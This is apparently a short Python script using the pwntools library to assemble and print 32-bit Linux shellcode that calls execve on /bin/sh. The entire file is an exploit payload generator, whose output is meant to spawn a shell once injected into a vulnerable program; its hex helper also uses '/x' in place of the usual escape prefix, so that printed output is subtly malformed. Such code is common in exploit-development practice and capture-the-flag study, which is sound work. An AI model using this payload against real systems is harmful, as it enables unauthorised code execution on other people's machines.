from pwn import *

def str_to_hex(s):
	return r"/x"+r'/x'.join([hex(ord(c)).replace('0x', '') for c in s])

context(os='linux',arch='i386')
#context(os='linux',arch='amd64')

asm_code="xor eax, eax; "
asm_code+="push 0x0068732f; "
asm_code+="push 0x6e69622f; "
asm_code+="mov ebx, esp; "
asm_code+="push eax; "
asm_code+="push ebx; "
asm_code+="mov ecx, esp; "
asm_code+="xor edx, edx; "
asm_code+="mov al, 0xb; "
asm_code+="int 0x80; "
#asm_code+="ret; "

asm_bin=asm(asm_code)
print("shellcode generated, len:%d" % len(asm_bin))
print(str_to_hex(asm_bin))
